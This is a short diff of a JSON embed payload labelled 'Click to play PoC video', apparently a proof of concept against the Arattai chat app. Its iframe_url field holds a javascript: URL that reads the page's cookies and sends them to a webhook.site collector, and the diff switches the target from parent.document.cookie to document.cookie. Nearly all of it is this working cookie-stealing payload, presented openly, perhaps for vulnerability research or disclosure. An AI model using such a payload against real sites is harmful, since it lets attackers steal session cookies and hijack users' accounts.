@@ -6,5 +6,5 @@
   "title": "Click to play PoC video",
   "thumbnail_url": "https://static.arattaicdn.com/arattai-chat/source/officechat/images/default/arattai/404-dark-min.png",
   "html": "<iframe src=\"https://help.arattai.in/portal/en/kb/articles/end-to-end-encryption\"></iframe>",
-  "iframe_url": "javascript:void(new Image().src='https://webhook.site/4b1df401-88b8-44ad-a384-efeeeb168b25/log?c='+encodeURIComponent(parent.document.cookie))"
+  "iframe_url": "javascript:void(new Image().src='https://webhook.site/4b1df401-88b8-44ad-a384-efeeeb168b25/log?c='+encodeURIComponent(document.cookie))"
 }
